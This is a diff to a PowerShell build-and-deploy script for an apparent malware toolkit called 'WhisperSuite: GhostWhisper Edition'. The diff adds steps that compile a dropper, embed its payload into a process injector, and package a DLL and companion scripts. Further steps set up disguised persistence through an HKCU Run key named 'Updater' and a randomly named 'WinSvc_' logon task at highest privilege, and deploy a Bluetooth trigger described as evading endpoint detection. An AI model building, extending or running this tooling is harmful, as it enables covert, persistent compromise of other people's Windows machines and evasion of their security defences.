@@ -2,18 +2,19 @@
 # Master build + deployment script for WhisperSuite: GhostWhisper Edition
 # Includes compilation, polymorphism, persistence, BLE trigger, wormhole, and virtualization
 
-$baseDir = "$PSScriptRoot"
-$finalPackage = "$baseDir\WhisperSuite_Build"
+$baseDir = $PSScriptRoot
+$finalPackage = Join-Path $baseDir "WhisperSuite_Build"
+$dropperSource = Join-Path $baseDir "Dropper_with_Raven.cpp"
 
 # === Core Binaries ===
-$ghostKeyDLL = "$baseDir\GhostKey\bin\Release\GhostKey.dll"
-$injectorEXE = "$baseDir\WraithTap\x64\Release\WraithTap.exe"
-$dropperEXE = "$baseDir\Dropper_with_Raven.exe"
-$cleanerPS1 = "$baseDir\SilentBloom.ps1"
-$bleTriggerScript = "$baseDir\BLETrigger.ps1"
-$polymorphScript = "$baseDir\GhostPolymorph.ps1"
-$bleConnectScript = "$baseDir\GhostBLEConnect_v2.ps1"
-$bootstrapScript = "$baseDir\GhostWhisperBootstrap.ps1"
+$ghostKeyDLL = Join-Path $baseDir "GhostKey\bin\Release\GhostKey.dll"
+$injectorEXE = Join-Path $baseDir "WraithTap\x64\Release\WraithTap.exe"
+$dropperEXE = Join-Path $baseDir "Dropper_with_Raven.exe"
+$cleanerPS1 = Join-Path $baseDir "SilentBloom.ps1"
+$bleTriggerScript = Join-Path $baseDir "BLETrigger.ps1"
+$polymorphScript = Join-Path $baseDir "GhostPolymorph.ps1"
+$bleConnectScript = Join-Path $baseDir "GhostBLEConnect_v2.ps1"
+$bootstrapScript = Join-Path $baseDir "GhostWhisperBootstrap.ps1"
 
 # === Modules ===
 $modulePaths = @(
@@ -39,9 +40,37 @@ function Compile-Projects {
     msbuild "$baseDir\WraithTap\WraithTap.vcxproj" /p:Configuration=Release /p:Platform=x64 | Out-Null
 }
 
+function Compile-Dropper {
+    Write-Host "[*] Compiling Dropper_with_Raven.cpp (poem embed tool)..."
+
+    if (Test-Path $dropperSource) {
+        & cl.exe /EHsc /O2 "/Fe:$dropperEXE" $dropperSource
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "[+] Dropper compiled: $dropperEXE"
+        }
+        else {
+            Write-Warning "[-] Dropper compile failed with exit code $LASTEXITCODE"
+        }
+    }
+    else {
+        Write-Warning "[-] $dropperSource not found; skipping poem embed step."
+    }
+}
+
 function Embed-RavenPoem {
     Write-Host "[*] Embedding Raven's poem into injector..."
-    & $dropperEXE $injectorEXE
+    if (Test-Path $dropperEXE -and (Test-Path $injectorEXE)) {
+        & $dropperEXE $injectorEXE
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "[+] Poem appended successfully."
+        }
+        else {
+            Write-Warning "[-] Poem embed failed. Exit code: $LASTEXITCODE"
+        }
+    }
+    else {
+        Write-Warning "[-] Dropper or WraithTap exe missing; cannot embed poem."
+    }
 }
 
 function Prepare-Package {
@@ -49,20 +78,25 @@ function Prepare-Package {
     New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
     New-Item -ItemType Directory -Path "$finalPackage\Modules" -Force | Out-Null
 
-    # Core components
-    Copy-Item $injectorEXE "$finalPackage\WraithTap.exe" -Force
-    Copy-Item $ghostKeyDLL "$finalPackage\GhostKey.dll" -Force
-    Copy-Item $cleanerPS1 "$finalPackage\SilentBloom.ps1" -Force
-    Copy-Item $bleTriggerScript "$finalPackage\BLETrigger.ps1" -Force
-    Copy-Item $polymorphScript "$finalPackage\GhostPolymorph.ps1" -Force
-    Copy-Item $bleConnectScript "$finalPackage\GhostBLEConnect_v2.ps1" -Force
-    Copy-Item $bootstrapScript "$finalPackage\GhostWhisperBootstrap.ps1" -Force
+    # Copy final EXE (poem embedded) + other artifacts
+    Copy-Item $injectorEXE        (Join-Path $finalPackage "WraithTap.exe") -Force
+    Copy-Item $ghostKeyDLL        (Join-Path $finalPackage "GhostKey.dll")  -Force
+    Copy-Item $cleanerPS1         (Join-Path $finalPackage "SilentBloom.ps1") -Force
+    Copy-Item $bleTriggerScript   (Join-Path $finalPackage "BLETrigger.ps1")  -Force
+    Copy-Item $polymorphScript    (Join-Path $finalPackage "GhostPolymorph.ps1") -Force
+    Copy-Item $bleConnectScript   (Join-Path $finalPackage "GhostBLEConnect_v2.ps1") -Force
+    Copy-Item $bootstrapScript    (Join-Path $finalPackage "GhostWhisperBootstrap.ps1") -Force
 
     # Modules
     foreach ($mod in $modulePaths) {
-        if (Test-Path "$baseDir\$mod") {
-            Copy-Item "$baseDir\$mod" "$finalPackage\$mod" -Force
-        } else {
+        $fullPath = Join-Path $baseDir $mod
+        if (Test-Path $fullPath) {
+            $destPath = Join-Path $finalPackage $mod
+            # Ensure directory structure
+            New-Item -ItemType Directory -Path (Split-Path $destPath) -Force | Out-Null
+            Copy-Item $fullPath $destPath -Force
+        }
+        else {
             Write-Warning "[!] Missing module: $mod"
         }
     }
@@ -75,7 +109,7 @@ And for one who is gone, but not forgotten.
 
 —R
 "@
-    Set-Content -Path "$finalPackage\note.txt" -Value $note
+    Set-Content -Path (Join-Path $finalPackage "note.txt") -Value $note
 
     Write-Host "[✓] WhisperSuite is ready: $finalPackage"
 }
@@ -88,26 +122,36 @@ function Setup-Persistence {
     $execCommand = "$injectorPath $payloadPath"
 
     try {
-        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value $execCommand -Force
+        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
+            -Name "Updater" -Value $execCommand -Force
         Write-Host "[+] Registry persistence set (HKCU Run key)."
-    } catch {
+    }
+    catch {
         Write-Warning "[-] Failed to create registry key: $_"
     }
 
     try {
         $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
-        schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" /sc onlogon /rl highest /f | Out-Null
+        schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" `
+            /sc onlogon /rl highest /f | Out-Null
         Write-Host "[+] Scheduled task created ($taskName)."
-    } catch {
+    }
+    catch {
         Write-Warning "[-] Failed to create scheduled task: $_"
     }
 }
 
 function Deploy-BLETrigger {
     Write-Host "[*] Creating BLE trigger script with encrypted handshake and EDR evasion..."
-    $bleScript = Get-Content "$baseDir\Templates\BLETrigger_Encrypted.ps1" -Raw
-    Set-Content -Path $bleTriggerScript -Value $bleScript
-    Write-Host "[+] BLE trigger deployed."
+    $templatePath = Join-Path $baseDir "Templates\BLETrigger_Encrypted.ps1"
+    if (Test-Path $templatePath) {
+        $bleScript = Get-Content $templatePath -Raw
+        Set-Content -Path $bleTriggerScript -Value $bleScript
+        Write-Host "[+] BLE trigger deployed."
+    }
+    else {
+        Write-Warning "[-] BLETrigger_Encrypted.ps1 not found in Templates."
+    }
 }
 
 function Show-Obfuscation-Checklist {
@@ -131,6 +175,7 @@ function Show-Deployment-Flow {
 
 # === EXECUTION ===
 Compile-Projects
+Compile-Dropper
 Embed-RavenPoem
 Prepare-Package
 Setup-Persistence
